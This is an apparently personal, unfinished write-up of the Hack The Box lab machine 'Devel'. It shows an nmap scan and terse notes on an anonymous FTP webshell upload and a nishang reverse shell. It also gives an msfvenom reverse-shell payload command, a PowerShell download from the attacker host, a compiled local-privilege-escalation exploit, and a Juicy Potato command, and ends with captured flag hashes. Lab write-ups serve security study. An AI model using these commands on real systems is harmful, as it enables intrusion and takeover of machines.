+++
title = "HTB - Devel"
date = 2024-11-30
+++

#windows #manual #unfinished
### Scan
```
└─# nmap -sV -sC --open -p- 10.10.10.5 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 16:09 EDT
Nmap scan report for 10.10.10.5
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.94 seconds

```

### Enumeration


##### 21
FTP anonymous<img alt="Image" async src="images/Screenshot 2024-09-09 at 4.29.40 PM.png" width="800px"></img>
big nono cve<img alt="Image" async src="images/Screenshot 2024-09-09 at 4.41.32 PM.png" width="800px"></img>
FTP upload<img alt="Image" async src="images/Screenshot 2024-09-09 at 6.25.26 PM.png" width="800px"></img>
ASP/X vulnerability upon research of version
webshell prompt!<img alt="Image" async src="images/Screenshot 2024-09-09 at 6.26.19 PM.png" width="800px"></img>
nishang shell served bby python server (Invokerevtcp)

version information<img alt="Image" async src="images/Screenshot 2024-09-09 at 6.58.49 PM.png" width="800px"></img>
Local privesc to fit our needs
<img alt="Image" async src="images/Screenshot 2024-09-09 at 7.02.07 PM.png" width="800px"></img>
Compiling notes in exploit db<img alt="Image" async src="images/Screenshot 2024-09-09 at 7.04.56 PM.png" width="800px"></img>
update and install mingw-w64
compile `i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32`
push from box to target `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3:80/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"`

##### 80
Landing Page <img alt="Image" async src="images/Screenshot 2024-09-09 at 4.27.54 PM.png" width="800px"></img>
Microsoft IIS server 7.5
upload aspx and set up listener
make and move to temp dir to transfer juicy potato and revshell (rev shell `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9999 -f exe > reverse.exe`)

move files with certutil

set up listener for higher priv shell
use JP to escalate `jp.exe -l 9999 -p rev.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`. Make sure to use x86 for this box, as its 32 bit.

Boom <img alt="Image" async src="images/Screenshot 2024-10-04 at 9.30.24 PM.png" width="800px"></img>

USER:aeb10d6e0f12af213b3313aaf5d006a3

ROOT:e4c733d153de83f5cb330af1ebc6470e
USER: e1b33ec1245ae20d092a935b35203c7e


